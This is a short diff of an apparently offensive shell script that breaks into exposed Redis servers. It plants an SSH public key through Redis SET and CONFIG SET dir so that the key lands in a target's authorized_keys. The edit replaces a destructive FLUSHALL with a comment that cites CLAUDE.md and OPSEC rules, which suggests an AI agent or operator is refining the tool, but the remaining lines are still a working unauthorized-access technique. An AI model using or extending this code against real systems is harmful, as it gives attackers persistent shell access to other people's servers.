@@ -118,7 +118,11 @@ fi
 SUCCESS_DIR=""
 for d in $SSH_DIRS; do
     log "Trying dir=$d"
-    rcmd FLUSHALL ASYNC >/dev/null    # make sure RDB is minimal
+    # NOTE: we deliberately do NOT FLUSHALL here. Wiping the target's keyspace is
+    # destructive and unrecoverable (violates CLAUDE.md §1 / OPSEC §9). It is also
+    # unnecessary: the pubkey is padded with newlines (KEY_BLOB) so it survives as a
+    # valid authorized_keys line regardless of whatever RDB cruft precedes it. If you
+    # ever genuinely need a minimal RDB, gate it behind an explicit, disclosed --flush.
     rcmd SET sshpwn "$KEY_BLOB" >/dev/null
     rcmd CONFIG SET dir "$d" 2>/dev/null
     setrc=$?
